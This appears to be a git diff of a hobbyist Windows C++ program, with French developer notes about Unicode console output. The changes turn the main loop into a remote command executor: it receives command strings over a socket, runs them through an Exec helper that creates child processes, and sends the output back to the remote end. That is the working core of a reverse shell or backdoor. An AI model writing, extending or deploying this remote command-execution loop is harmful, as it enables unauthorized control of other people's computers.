@@ -5,8 +5,8 @@ using namespace std;
 #include "../inc/common.h"
 #include "../inc/Exec.h"
 
-#include <psapi.h>
-
+#define UNICODE
+#define _UNICODE
 
 wstring testlol()
 {   
@@ -28,30 +28,43 @@ int find_last_backslash(wstring &find_me)
     return index + 1;
 }
 
+//https://stackoverflow.com/questions/6693010/how-do-i-use-multibytetowidechar
+
+wstring ConvertUtf8ToWide(const string& str)
+{
+    int count = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), NULL, 0);
+    wstring wstr(count, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), &wstr[0], count);
+    return wstr;
+}
+
+
 int main()
 {
+    /*
+    Found
+    CHAR fuck[] = "Ελληνικά";
+    cout << "sizeof fuck: " << strlen(fuck) << endl;
+    
     _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
+    
+    wcout <<  ConvertUtf8ToWide((string) fuck) << endl;
+    exit(0);
+    */
 
-    wcout << testlol() << endl;
-    wcout << MAX_PATH << endl;
-    WCHAR test1[MAX_PATH];
-    wcout << sizeof(test1) << " vs " << MAX_PATH << endl;
-    
-    WCHAR buff[MAX_PATH] = {0};
-    
-    DWORD status = GetModuleFileNameW(NULL, buff, MAX_PATH);
-    wstring tmp = buff;
-    wstring name_of_my_fucking_exe =  tmp.substr(find_last_backslash(tmp));
-    
-    wcout << "my name: " <<name_of_my_fucking_exe << endl;
-    
-    wcout << "status: " << status << endl;
-    wcout << buff << endl; 
-    cout << "next ?" << endl;
-    
-    cout << GetLastError() << endl;
 
+   /*
+    vector <string> tamer = Exec().executeCommand(L"dir");
+    for(int i=0; i < tamer.size(); i++)
+    {
+        cout << tamer[i] << endl;
+    }
+    exit(0);
     Sleep(500);
+    */
+
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleCP(CP_UTF8);
     WSADATA WSAData; 
     
     SOCKET sock;
@@ -74,81 +87,89 @@ int main()
         //Whait...;  
     } 
 
-    WCHAR buff_wchar[4096];
+    CHAR buff_char[4096];
 
+    string command;
+    wstring w_cmd;
+    vector<string> result;
+
+
+    int stat,len_MultiByteToWideChar;
+
+    
+    //char test[] = "Ελληνικά";
+    //cout << strlen(test) << endl;
+
+    //send(sock, test, sizeof(test), 0);
+
+
+    vector <string> utf8exec;
+    //_setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
     while(true)
     {
-        wcout << "CONNECTED" << endl;
+        ZeroMemory(&buff_char, sizeof(buff_char));
+        w_cmd.erase();
+        recv(sock, buff_char, sizeof(buff_char), 0);
+        cout << "Commande: " <<  buff_char << endl;
 
-        wstring input;
+        w_cmd = ConvertUtf8ToWide((string) buff_char);
 
-        getline(wcin, input);
-        Exec exec;
-        vector<wstring> result;
-        result = exec.executeCommand(L"dir");
+        utf8exec =  Exec().executeCommand(w_cmd);
 
-        for(int i=0;i< result.size(); i++)
+        for(int i = 0;i < utf8exec.size(); i++)
         {
-            send(sock, (char *)result[i].c_str(), wcslen(result[i].c_str()) * sizeof(WCHAR), 0);
-            //wcout << result[i] << endl;
-            wcout << "size: " << result[i].size() << endl; 
-
-            ZeroMemory(&buff_wchar, wcslen(buff_wchar));
-        
+            send(sock, utf8exec[i].c_str(), utf8exec[i].length(), 0);
+            wcout << "send : " << i << endl;
+            Sleep(300);
         }
-        char tamer[200];
-        //int stast=  recv(sock, tamer, sizeof(tamer), 0);
-        int stast = recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
-      //cout <<"010110>"  << tamer << endl;
-        wcout << "status: " << stast << endl;
-        wcout << "---->" << buff_wchar <<"<---" << endl;
-
-        wcout << "len: " << wcslen(buff_wchar) << endl;
-        wcout  << sizeof(buff_wchar) << endl;
-        _wsystem(L"pause");
-        break;
-
-        //wcout << "commande: " << input << endl;
-        //wcout <<"what: " << wcslen(input.c_str()) * sizeof(WCHAR) << endl;
-
-         
-        //Exec exec;
-        //vector<wstring> cmd = exec.executeCommand("dir");
-       // wcout << "------>   "<< cmd[0] <<"<-------" << endl;
-
-       // send(sock, (char *)cmd[0].c_str(), wcslen(cmd[0].c_str()) * sizeof(WCHAR), 0);
-        //send(sock, test, strlen(test), 0); found wtf
-      //  WCHAR buff[MAX_PATH];
-      //  _wgetcwd(buff, MAX_PATH); ne marche pas. Le serveur recoit C:\Users\cisco\Desktop\New folder\fntz\"oW[
-      
-        /*
-        WCHAR buff[MAX_PATH];
-        GetCurrentDirectoryW(MAX_PATH, buff);
-        wcout << buff << endl;
-        wcout << wcslen(buff) * sizeof(WCHAR) << " vs " << wcslen(buff) << endl;
-        send(sock, (char *)buff, wcslen(buff) * sizeof(WCHAR), 0);
-        */
-        /*
-        CHAR char1[] = "trestts";
-        cout << "char1: " << char1 <<endl;
-        cout << "MB_CUR_MAX: " << MB_CUR_MAX << endl;
-        WCHAR char2[1000];
-        int test = mbtowc(char2,char1, MB_CUR_MAX);
-        wcout <<"---." <<char2 << endl;
-        cout << "test: " << test << endl;
-        */
-        /*
-        int size_for_tchar = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, char1, strlen(char1), NULL, 0); // find the buffer size
-        cout << "size: " << size_for_tchar << endl;
-        WCHAR * wchar2 = new WCHAR[size_for_tchar];
-
-        MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, char1, strlen(char1), wchar2, size_for_tchar);
-        wcout << "---->" << wchar2 << endl;
-        delete [] wchar2;
-        */
-
-        input.erase();
-       
     }
+
     return 0;
 }
+
+
+/*
+Remarque:
+
+Ont pourraient stocker une chaine unicode dans un char, puis convertir la chaine en utf-16.
+example:
+char test[] = "Ελληνικά"
+wcout << convert(test) << endl;
+//La taille de test est de 16 octets. 
+
+Probleme:
+(1) Mon probleme est que je n'arrive pas à stocker un char unicode dans la fonction ReadFile.
+Pour bypass se probleme,je doit executer une commande avec l'argument /U (pour unicode).
+le probleme est que certaine commande ne sont a priori pas compatible avec l'argument /U, le resultat de la commande me renvoie du chinois ou du russe lol.
+
+
+(2)Si je passe la fonction ReadFile avec un buffer de type char, alors tous les char(s) unicode apparaissent avec des points d'interrogation. 
+
+
+Hypothese:
+
+
+Je pense que pour remedier a se probleme, 1 -je vais devoir retirer l'argument /U
+2- changer le buffer de ReadFile par un CHAR et non un WCHAR.
+3- Je pense  que le probleme (2) viens du fait que lors de l'appel de CreatProcessW, le processus enfants ne prends pas en charge l'unicode.
+Car lors de l'affichage du char unicode via cout, jobtient des carres et non des points d'interrogation.
+
+Experience:
+
+Pour resoudre le probleme 1, j'ai donc essayé de créer un processus avec une nouvelle fenetre, et les chars unicode se sont bien afficher.
+Je pense donc que le probleme viens de ReadFile . 
+Le probleme ne viens pas de ReadFile.
+
+Il viens donc de soit CreatProcess, ou l'argument /C
+
+Peut etre essayer d'ecrire directement dans la console plutot que passer par "/C" ? 
+
+Resolution du probleme:
+
+Mon probleme etait donc composé de deux erreurs.
+
+CREATE NO WINDOWS : Le processus est une application console qui s'exécute sans fenêtre de console. Par conséquent, le handle de console de l'application n'est pas défini.
+
+- ??? : https://stackoverflow.com/questions/43558888/readfile-in-windows
+- https://stackoverflow.com/questions/39007332/c-getting-utf-8-output-from-createprocess
+*/
